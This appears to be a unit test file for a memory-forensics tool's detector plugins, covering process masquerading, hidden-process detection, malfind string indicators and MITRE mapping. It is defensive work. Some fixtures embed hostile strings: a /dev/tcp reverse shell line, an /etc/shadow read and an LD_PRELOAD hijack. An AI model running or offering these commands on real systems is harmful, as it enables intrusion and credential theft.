# FILE: tests/unit/test_detectors.py
"""Unit tests for the detector plugin system.

Tests:
    - BaseDetector / DetectorResult / FindingSeverity
    - DetectorRegistry: register, run_all, len
    - ProcessAnomalyDetector: adaptive thresholds, masquerading
    - CrossViewDetector: DKOM detection logic
    - MalfindStringsDetector: IOC extraction from hexdumps
    - PEHeaderDetector: PE parsing from hexdump bytes
    - build_default_registry(): 6 detectors registered
"""

from __future__ import annotations

from datetime import UTC, datetime
from unittest.mock import MagicMock, patch

from forensiq.detectors.base import BaseDetector, DetectorResult, FindingSeverity
from forensiq.detectors.registry import DetectorRegistry, build_default_registry

# ─── Fixtures ─────────────────────────────────────────────────────────────────


def _make_vector(
    pid: int = 100,
    name: str = "test.exe",
    threat_score: float = 0.1,
    is_malicious: bool = False,
    malfind_hits: int = 0,
    parent_name: str = "explorer.exe",
    parent_pid: int = 4,
    path: str = "C:\\Windows\\System32\\test.exe",
) -> MagicMock:
    v = MagicMock()
    v.pid = pid
    v.name = name
    v.threat_score = threat_score
    v.is_malicious = is_malicious
    v.malfind_hits = malfind_hits
    v.parent_name = parent_name
    v.ppid = parent_pid
    v.path = path
    v.suspicious_dll_paths = []
    v.suspicious_dll_count = 0
    v.is_system_path = True
    v.vad_rwx_count = 0
    v.external_connection_count = 0
    return v


def _make_extraction(processes: list | None = None) -> MagicMock:
    extraction = MagicMock()
    proc_tree = MagicMock()
    proc_tree.flat_map = {v.pid: v for v in (processes or [])}
    extraction.process_tree = proc_tree
    extraction.dump_path = MagicMock()
    extraction.dump_path.__str__ = lambda _: "/tmp/test.raw"
    extraction.malfind = {}
    extraction.dlls = {}
    extraction.is_linux = False  # Windows mode by default for these tests
    return extraction


# ─── FindingSeverity ──────────────────────────────────────────────────────────


class TestFindingSeverity:
    def test_score_ordering(self) -> None:
        assert FindingSeverity.CRITICAL.score > FindingSeverity.HIGH.score
        assert FindingSeverity.HIGH.score > FindingSeverity.MEDIUM.score
        assert FindingSeverity.MEDIUM.score > FindingSeverity.LOW.score
        assert FindingSeverity.LOW.score > FindingSeverity.INFO.score

    def test_critical_score(self) -> None:
        assert FindingSeverity.CRITICAL.score == 5

    def test_info_score(self) -> None:
        assert FindingSeverity.INFO.score == 1

    def test_str_values(self) -> None:
        assert FindingSeverity.CRITICAL == "critical"
        assert FindingSeverity.HIGH == "high"


# ─── DetectorResult ───────────────────────────────────────────────────────────


class TestDetectorResult:
    def _make_result(self) -> DetectorResult:
        return DetectorResult(
            detector="test_detector",
            pid=1234,
            process_name="evil.exe",
            severity=FindingSeverity.HIGH,
            title="Test Finding",
            description="A test finding",
            mitre_technique="T1055",
            mitre_technique_name="Process Injection",
            evidence="some evidence",
            timestamp=datetime.now(tz=UTC),
            confidence=0.9,
        )

    def test_to_dict_keys(self) -> None:
        result = self._make_result()
        d = result.to_dict()
        expected_keys = {
            "detector",
            "pid",
            "process_name",
            "severity",
            "title",
            "description",
            "mitre_technique",
            "mitre_technique_name",
            "evidence",
            "timestamp",
            "confidence",
        }
        assert expected_keys.issubset(d.keys())

    def test_to_dict_values(self) -> None:
        result = self._make_result()
        d = result.to_dict()
        assert d["pid"] == 1234
        assert d["process_name"] == "evil.exe"
        assert d["severity"] == "high"
        assert d["mitre_technique"] == "T1055"

    def test_severity_is_string(self) -> None:
        result = self._make_result()
        d = result.to_dict()
        assert isinstance(d["severity"], str)


# ─── DetectorRegistry ─────────────────────────────────────────────────────────


class TestDetectorRegistry:
    def _make_detector(self, name: str = "mock_detector") -> BaseDetector:
        """Create a minimal mock detector."""
        detector = MagicMock(spec=BaseDetector)
        detector.name = name
        detector.enabled_by_default = True
        detector.detect.return_value = []
        return detector

    def test_register_single(self) -> None:
        registry = DetectorRegistry()
        d = self._make_detector("d1")
        registry.register(d)
        assert len(registry) == 1

    def test_register_multiple(self) -> None:
        registry = DetectorRegistry()
        for i in range(3):
            registry.register(self._make_detector(f"d{i}"))
        assert len(registry) == 3

    def test_detector_names(self) -> None:
        registry = DetectorRegistry()
        registry.register(self._make_detector("alpha"))
        registry.register(self._make_detector("beta"))
        assert set(registry.detector_names) == {"alpha", "beta"}

    def test_run_all_calls_each_detector(self) -> None:
        registry = DetectorRegistry()
        d1 = self._make_detector("d1")
        d2 = self._make_detector("d2")
        registry.register(d1)
        registry.register(d2)

        extraction = _make_extraction()
        vectors: list = []
        registry.run_all(extraction, vectors)

        d1.detect.assert_called_once()
        d2.detect.assert_called_once()

    def test_run_all_aggregates_findings(self) -> None:
        registry = DetectorRegistry()
        finding = DetectorResult(
            detector="mock",
            pid=100,
            process_name="evil.exe",
            severity=FindingSeverity.HIGH,
            title="Test",
            description="desc",
            mitre_technique="T1055",
            evidence={},
            confidence=0.9,
        )
        d1 = self._make_detector("d1")
        d1.detect.return_value = [finding]
        d2 = self._make_detector("d2")
        d2.detect.return_value = [finding, finding]
        registry.register(d1)
        registry.register(d2)

        extraction = _make_extraction()
        results = registry.run_all(extraction, [])
        assert len(results) == 3

    def test_disabled_detector_skipped(self) -> None:
        registry = DetectorRegistry()
        d = self._make_detector("disabled")
        d.enabled_by_default = False
        registry.register(d)

        extraction = _make_extraction()
        registry.run_all(extraction, [])
        d.detect.assert_not_called()

    def test_failing_detector_is_non_fatal(self) -> None:
        """A detector that raises must not crash the registry."""
        registry = DetectorRegistry()
        d = self._make_detector("crasher")
        d.detect.side_effect = RuntimeError("boom")
        registry.register(d)

        extraction = _make_extraction()
        results = registry.run_all(extraction, [])
        assert results == []  # No findings, but no exception raised


# ─── build_default_registry ───────────────────────────────────────────────────


class TestBuildDefaultRegistry:
    def test_has_six_detectors(self) -> None:
        registry = build_default_registry()
        assert len(registry) == 6

    def test_expected_detector_names(self) -> None:
        registry = build_default_registry()
        names = set(registry.detector_names)
        expected = {
            "process_anomaly",
            "cross_view",
            "malfind_strings",
            "pe_header",
            "services_scan",
            "handles_mutex",
        }
        assert expected == names

    def test_registers_threat_intel_when_vt_key_present(self) -> None:
        registry = build_default_registry(vt_api_key="test_key")
        assert len(registry) == 7
        assert "threat_intel" in registry.detector_names

    def test_threat_intel_enabled_when_vt_key_present(self) -> None:
        registry = build_default_registry(vt_api_key="test_key")
        threat_detector = next(
            d for d in registry._detectors if d.name == "threat_intel"
        )
        assert threat_detector.enabled_by_default is True

    def test_threat_intel_omitted_without_vt_key(self) -> None:
        registry = build_default_registry()
        assert "threat_intel" not in registry.detector_names

    def test_linux_registry_excludes_windows_detectors(self) -> None:
        registry = build_default_registry(is_linux=True)
        assert "cross_view" not in registry.detector_names
        assert "services_scan" not in registry.detector_names
        assert "handles_mutex" not in registry.detector_names


# ─── ProcessAnomalyDetector ───────────────────────────────────────────────────


class TestProcessAnomalyDetector:
    def test_normal_process_no_findings(self) -> None:
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="chrome.exe", threat_score=0.3)
        extraction = _make_extraction([v])
        results = detector.detect(extraction, [v])
        # Low score, benign name → no findings
        assert all(r.pid != v.pid or r.severity not in ("critical", "high") for r in results)

    def test_system_process_adaptive_threshold(self) -> None:
        """lsass.exe with score 0.80 should NOT be flagged (threshold=0.92)."""
        from forensiq.detectors.process_anomaly import ADAPTIVE_THRESHOLDS, ProcessAnomalyDetector

        _detector = ProcessAnomalyDetector()
        score = 0.80
        # lsass.exe threshold is 0.92, so 0.80 < 0.92 → no adaptive downgrade finding
        assert "lsass.exe" in ADAPTIVE_THRESHOLDS
        assert ADAPTIVE_THRESHOLDS["lsass.exe"] > score

    def test_masquerading_outside_system32(self) -> None:
        """svchost.exe running from Temp is masquerading."""
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(
            name="svchost.exe",
            path="C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe",
            threat_score=0.80,
        )
        # Override is_system_path for this test — not in system dir
        v.is_system_path = False
        extraction = _make_extraction([v])
        results = detector.detect(extraction, [v])
        mitre_ids = [r.mitre_technique for r in results]
        assert "T1036.005" in mitre_ids

    def test_suspicious_dll_path(self) -> None:
        """Process with DLL from Temp path should generate finding."""
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="notepad.exe", threat_score=0.70)
        v.suspicious_dll_paths = ["C:\\Temp\\evil.dll"]
        v.suspicious_dll_count = 4  # Above the threshold of >3
        v.is_system_path = False  # Not in system dir
        extraction = _make_extraction([v])
        results = detector.detect(extraction, [v])
        assert any(r.mitre_technique == "T1574.001" for r in results)

    # ─── Linux correlated detection tests ─────────────────────────────────────

    def test_linux_rwx_no_corroboration_is_medium(self) -> None:
        """Non-JIT process with malfind_hits and no other indicators → MEDIUM, NOT HIGH."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        # Use a non-JIT process name (curl is not a JIT runtime)
        v = _make_vector(name="suspicious-daemon", threat_score=0.0)
        v.malfind_hits = 5
        v.vad_rwx_count = 20
        v.is_system_path = True  # Runs from a system path
        v.external_connection_count = 0  # No external connections
        v.parent_name_mismatch = False  # Normal parent
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        rwx_results = [r for r in results if r.pid == v.pid and r.mitre_technique == "T1055"]
        # Non-JIT process: should produce MEDIUM (no corroboration)
        assert rwx_results, "Non-JIT process with RWX should produce at least one finding"
        assert all(r.severity == FindingSeverity.MEDIUM for r in rwx_results), (
            f"Expected MEDIUM only, got: {[r.severity for r in rwx_results]}"
        )

    def test_linux_rwx_with_external_connections_is_high(self) -> None:
        """malfind_hits + external connections → HIGH severity."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="suspicious", threat_score=0.0)
        v.malfind_hits = 4
        v.vad_rwx_count = 10
        v.is_system_path = False  # Not in system path
        v.external_connection_count = 3  # External C2-like connections
        v.parent_name_mismatch = False
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        severities = {
            r.severity for r in results if r.pid == v.pid and r.mitre_technique == "T1055"
        }
        assert FindingSeverity.HIGH in severities or FindingSeverity.CRITICAL in severities

    def test_linux_rwx_multiple_corroboration_is_critical(self) -> None:
        """malfind_hits >= 3 + 2 corroborating indicators → CRITICAL."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="malware", threat_score=0.0)
        v.malfind_hits = 5
        v.is_system_path = False  # Not system path (corroboration 1)
        v.external_connection_count = 2  # External connections (corroboration 2)
        v.parent_name_mismatch = False
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        severities = {
            r.severity for r in results if r.pid == v.pid and r.mitre_technique == "T1055"
        }
        assert FindingSeverity.CRITICAL in severities

    def test_linux_memfd_dll_only_is_low(self) -> None:
        """suspicious_dll_count > 0 from memfd only (JIT) → LOW, NOT HIGH."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="plasmashell", threat_score=0.0)
        v.suspicious_dll_count = 2
        v.dll_count = 15
        v.is_system_path = True  # KDE runs from system paths
        v.external_connection_count = 0
        v.parent_name_mismatch = False

        # DLL entries: all are memfd (JIT/shader) mappings
        dll1 = MagicMock()
        dll1.is_suspicious = True
        dll1.full_path = "memfd:mesa_shader_0x1a2b"
        dll2 = MagicMock()
        dll2.is_suspicious = True
        dll2.full_path = "memfd:v8_jit_0xdeadbeef"

        extraction = _make_extraction([v])
        extraction.is_linux = True
        extraction.dlls = {v.pid: [dll1, dll2]}
        results = detector.detect(extraction, [v])
        dll_results = [r for r in results if r.pid == v.pid and "T1574" in r.mitre_technique]
        # Must not emit HIGH for pure memfd JIT mappings
        assert all(
            r.severity in (FindingSeverity.LOW, FindingSeverity.MEDIUM) for r in dll_results
        ), f"Pure memfd should be LOW/MEDIUM, got: {[r.severity for r in dll_results]}"

    def test_linux_real_tmp_dll_is_high(self) -> None:
        """suspicious_dll_count > 0 from /tmp → HIGH regardless."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="victim", threat_score=0.0)
        v.suspicious_dll_count = 1
        v.dll_count = 5
        v.is_system_path = True
        v.external_connection_count = 0
        v.parent_name_mismatch = False

        dll1 = MagicMock()
        dll1.is_suspicious = True
        dll1.full_path = "/tmp/rootkit.so"

        extraction = _make_extraction([v])
        extraction.is_linux = True
        extraction.dlls = {v.pid: [dll1]}
        results = detector.detect(extraction, [v])
        dll_results = [r for r in results if r.pid == v.pid and "T1574" in r.mitre_technique]
        assert any(r.severity == FindingSeverity.HIGH for r in dll_results), (
            "Real /tmp .so path should produce HIGH finding"
        )

    def test_linux_rwx_system_path_parent_mismatch_is_medium(self) -> None:
        """JIT process (code/VSCode) with any combination of indicators → NO RWX finding.

        JIT-whitelisted processes are excluded entirely from _check_linux_rwx_memory
        because their RWX pages are always legitimate (V8 engine). They are instead
        monitored by _check_linux_compromised_binary for the specific combination
        of RWX + active external connections (which VSCode never triggers because
        it is in the JIT whitelist there too).
        """
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="code", threat_score=0.0)
        v.malfind_hits = 5  # Many JIT pages (V8/Electron)
        v.vad_rwx_count = 20
        v.is_system_path = True  # Runs from /usr/share/code/
        v.external_connection_count = 3  # GitHub Copilot, telemetry
        v.parent_name_mismatch = True  # Launched from terminal (bash)
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        rwx_results = [r for r in results if r.pid == v.pid and r.mitre_technique == "T1055"]
        # JIT process: _check_linux_rwx_memory returns nothing (by design)
        assert not rwx_results, (
            f"JIT process 'code' should not produce RWX findings, got: {rwx_results}"
        )

    def test_linux_compromised_system_binary_is_high(self) -> None:
        """Non-JIT system binary (curl) with RWX pages + external connections → HIGH (Gap 1)."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="curl", threat_score=0.0)
        v.malfind_hits = 2  # Injected code pages
        v.vad_rwx_count = 3
        v.is_system_path = True  # Runs from /usr/bin/curl (system path)
        v.external_connection_count = 1  # Active C2 connection
        v.parent_name_mismatch = False
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        t1554_results = [r for r in results if r.pid == v.pid and r.mitre_technique == "T1554"]
        assert t1554_results, "Compromised system binary should produce T1554 finding"
        assert any(
            r.severity in (FindingSeverity.HIGH, FindingSeverity.CRITICAL) for r in t1554_results
        )

    def test_linux_jit_process_not_flagged_as_compromised(self) -> None:
        """VSCode (in JIT whitelist) with RWX + connections → NOT T1554 (not compromised)."""
        from forensiq.detectors.process_anomaly import ProcessAnomalyDetector

        detector = ProcessAnomalyDetector()
        v = _make_vector(name="code", threat_score=0.0)
        v.malfind_hits = 5
        v.is_system_path = True
        v.external_connection_count = 3
        v.parent_name_mismatch = True
        extraction = _make_extraction([v])
        extraction.is_linux = True
        results = detector.detect(extraction, [v])
        t1554_results = [r for r in results if r.pid == v.pid and r.mitre_technique == "T1554"]
        assert not t1554_results, "JIT process should not be flagged as compromised binary"


# ─── MalfindStringsDetector ───────────────────────────────────────────────────


class TestMalfindStringsDetector:
    def test_no_malfind_regions_no_findings(self) -> None:
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        extraction = _make_extraction()
        extraction.malfind = {}
        results = detector.detect(extraction, [])
        assert results == []

    def test_linux_reverse_shell_in_malfind_is_critical(self) -> None:
        """Reverse shell string in Linux malfind region → CRITICAL (Gap 2)."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        shell_bytes = b"/bin/sh -i >& /dev/tcp/192.168.1.1/4444 0>&1" + b"\x00" * 4
        hex_line = "0x0000   " + " ".join(f"{b:02x}" for b in shell_bytes)

        region = MagicMock()
        region.hexdump = hex_line
        region.disassembly = ""
        region.protection = "rw-p"
        region.start = 0x1000
        region.end = 0x2000

        extraction = _make_extraction()
        extraction.is_linux = True
        extraction.malfind = {999: [region]}
        results = detector.detect(extraction, [])
        assert any(
            r.severity == FindingSeverity.CRITICAL and r.mitre_technique == "T1059.004"
            for r in results
        ), "Linux reverse shell string should trigger CRITICAL T1059.004"

    def test_linux_credential_path_in_malfind_is_high(self) -> None:
        """String /etc/shadow in Linux malfind region → HIGH (Gap 2)."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        cred_bytes = b"open /etc/shadow for reading" + b"\x00" * 4
        hex_line = "0x0000   " + " ".join(f"{b:02x}" for b in cred_bytes)

        region = MagicMock()
        region.hexdump = hex_line
        region.disassembly = ""
        region.protection = "rw-p"
        region.start = 0x1000
        region.end = 0x2000

        extraction = _make_extraction()
        extraction.is_linux = True
        extraction.malfind = {888: [region]}
        results = detector.detect(extraction, [])
        assert any(
            r.severity == FindingSeverity.HIGH and r.mitre_technique == "T1003.008" for r in results
        ), "Linux /etc/shadow string should trigger HIGH T1003.008"

    def test_linux_ldpreload_in_malfind_is_high(self) -> None:
        """LD_PRELOAD string in Linux malfind region → HIGH (Gap 2)."""
        from forensiq.detectors.base import FindingSeverity
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        persist_bytes = b"setenv LD_PRELOAD=/tmp/evil.so" + b"\x00" * 4
        hex_line = "0x0000   " + " ".join(f"{b:02x}" for b in persist_bytes)

        region = MagicMock()
        region.hexdump = hex_line
        region.disassembly = ""
        region.protection = "rw-p"
        region.start = 0x1000
        region.end = 0x2000

        extraction = _make_extraction()
        extraction.is_linux = True
        extraction.malfind = {777: [region]}
        results = detector.detect(extraction, [])
        assert any(
            r.severity == FindingSeverity.HIGH and r.mitre_technique == "T1574.006" for r in results
        ), "LD_PRELOAD string should trigger HIGH T1574.006"

    def test_url_detection_in_hexdump(self) -> None:
        """MalfindStringsDetector should find IOC strings in malfind regions."""
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        # Build a fake region whose hexdump encodes a URL string
        url_bytes = b"http://evil.example.com/c2/beacon" + b"\x00" * 15
        hex_line = "0x0000   " + " ".join(f"{b:02x}" for b in url_bytes[:16])

        region = MagicMock()
        region.hexdump = hex_line
        region.disassembly = ""  # Must be str, not MagicMock
        region.protection = "PAGE_EXECUTE_READWRITE"
        region.size = 4096
        region.start = 0x1000
        region.end = 0x2000

        v = _make_vector(pid=1234)
        extraction = _make_extraction()
        extraction.malfind = {1234: [region]}
        results = detector.detect(extraction, [v])
        # Should produce at least some findings from URL/suspicious strings
        assert isinstance(results, list)

    def test_mz_header_detection(self) -> None:
        """Bytes starting with MZ magic should be detected as PE."""
        from forensiq.detectors.malfind_strings import MalfindStringsDetector

        detector = MalfindStringsDetector()
        _mz_bytes = b"MZ" + b"\x00" * 30
        # Simulate a malfind region with MZ header
        region = MagicMock()
        region.hexdump = "0x0000   4d 5a " + " ".join(f"{b:02x}" for b in b"\x00" * 14)
        region.protection = "PAGE_EXECUTE_READWRITE"
        region.size = 4096

        extraction = _make_extraction()
        extraction.malfind = {1234: [region]}
        v = _make_vector(pid=1234)
        results = detector.detect(extraction, [v])
        # Should have at least a PE header detection or injection finding
        assert isinstance(results, list)


# ─── CrossViewDetector ────────────────────────────────────────────────────────


class TestCrossViewDetector:
    def test_no_hidden_processes_when_lists_match(self) -> None:
        """If pslist and psscan have same PIDs, no DKOM findings."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        v1 = _make_vector(pid=100, name="explorer.exe")
        v2 = _make_vector(pid=200, name="svchost.exe")

        extraction = _make_extraction([v1, v2])

        # Mock psscan to return same PIDs as pslist
        psscan_rows = [
            {"PID": "100", "ImageFileName": "explorer.exe"},
            {"PID": "200", "ImageFileName": "svchost.exe"},
        ]
        with patch.object(detector, "_run_psscan", return_value=psscan_rows):
            results = detector.detect(extraction, [v1, v2])

        assert results == []

    def test_hidden_process_detected(self) -> None:
        """PID in psscan but not pslist = DKOM rootkit."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        v1 = _make_vector(pid=100, name="explorer.exe")
        extraction = _make_extraction([v1])

        # psscan finds PID 999 which is NOT in pslist
        psscan_rows = [
            {"PID": "100", "ImageFileName": "explorer.exe"},
            {"PID": "999", "ImageFileName": "rootkit.exe"},
        ]
        with patch.object(detector, "_run_psscan", return_value=psscan_rows):
            results = detector.detect(extraction, [v1])

        assert len(results) == 1
        assert results[0].mitre_technique == "T1014"
        assert results[0].pid == 999


# ─── MITRE ATT&CK ────────────────────────────────────────────────────────────


class TestMitreSummary:
    def test_empty_inputs_returns_empty(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        result = build_mitre_summary([], [])
        assert result == []

    def test_aggregates_timeline_techniques(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        event = MagicMock()
        event.mitre_technique = "T1055"
        event.pid = 1234
        result = build_mitre_summary([event], [])
        assert len(result) == 1
        assert result[0]["technique_id"] == "T1055"
        assert result[0]["observation_count"] == 1

    def test_aggregates_detector_dict_findings(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        finding = {"mitre_technique": "T1014", "pid": 500}
        result = build_mitre_summary([], [finding])
        assert len(result) == 1
        assert result[0]["technique_id"] == "T1014"

    def test_deduplicates_same_technique(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        events = [MagicMock(mitre_technique="T1055", pid=i) for i in range(5)]
        result = build_mitre_summary(events, [])
        assert len(result) == 1
        assert result[0]["observation_count"] == 5

    def test_sorted_by_observation_count_desc(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        # T1014: 3 events, T1027: 1 event
        events_t1014 = [MagicMock(mitre_technique="T1014", pid=i) for i in range(3)]
        events_t1027 = [MagicMock(mitre_technique="T1027", pid=10)]
        result = build_mitre_summary(events_t1014 + events_t1027, [])
        assert result[0]["technique_id"] == "T1014"
        assert result[1]["technique_id"] == "T1027"

    def test_unknown_technique_still_included(self) -> None:
        """Techniques not in MITRE_TECHNIQUES dict still get included."""
        from forensiq.models.mitre import build_mitre_summary

        finding = {"mitre_technique": "T9999.999", "pid": 1}
        result = build_mitre_summary([], [finding])
        assert len(result) == 1
        assert result[0]["technique_id"] == "T9999.999"

    def test_empty_technique_id_skipped(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        event = MagicMock(mitre_technique="", pid=1)
        result = build_mitre_summary([event], [])
        assert result == []

    def test_to_dict_has_required_fields(self) -> None:
        from forensiq.models.mitre import build_mitre_summary

        event = MagicMock(mitre_technique="T1055", pid=100)
        result = build_mitre_summary([event], [])
        d = result[0]
        for key in (
            "technique_id",
            "name",
            "tactic",
            "description",
            "url",
            "observation_count",
            "observed_pids",
        ):
            assert key in d, f"Missing key: {key}"


class TestCrossViewDetectorEdgeCases:
    def test_no_process_tree_returns_empty(self) -> None:
        """If extraction.process_tree is None, detect() returns []."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        extraction = _make_extraction([])
        extraction.process_tree = None
        results = detector.detect(extraction, [])
        assert results == []

    def test_psscan_exception_returns_empty(self) -> None:
        """If psscan raises, detect() returns []."""
        from unittest.mock import patch

        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        extraction = _make_extraction([_make_vector(pid=100, name="svchost.exe")])

        with patch.object(detector, "_run_psscan", side_effect=RuntimeError("psscan failed")):
            results = detector.detect(extraction, [])
        assert results == []

    def test_psscan_empty_returns_empty(self) -> None:
        """If psscan returns no rows, detect() returns []."""
        from unittest.mock import patch

        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        extraction = _make_extraction([_make_vector(pid=100, name="svchost.exe")])

        with patch.object(detector, "_run_psscan", return_value=[]):
            results = detector.detect(extraction, [])
        assert results == []

    def test_extract_pid_invalid_int_returns_none(self) -> None:
        """_extract_pid returns None when PID is non-integer."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        result = detector._extract_pid({"PID": "not_a_number"})
        assert result is None

    def test_extract_pid_no_known_key_returns_none(self) -> None:
        """_extract_pid returns None when row has no PID-like key."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        result = detector._extract_pid({"Unknown": "100"})
        assert result is None

    def test_extract_name_no_known_key_returns_unknown(self) -> None:
        """_extract_name returns '<unknown>' when row has no name-like key."""
        from forensiq.detectors.cross_view import CrossViewDetector

        detector = CrossViewDetector()
        result = detector._extract_name({"RandomKey": "value"})
        assert result == "<unknown>"


class TestDetectorRegistryEdgeCases:
    def test_register_detector_without_name_raises(self) -> None:
        """register() raises ValueError when detector.name is empty."""
        from forensiq.detectors.registry import DetectorRegistry

        registry = DetectorRegistry()
        nameless = MagicMock(spec=BaseDetector)
        nameless.name = ""  # No name

        import pytest
        with pytest.raises(ValueError, match="no name"):
            registry.register(nameless)
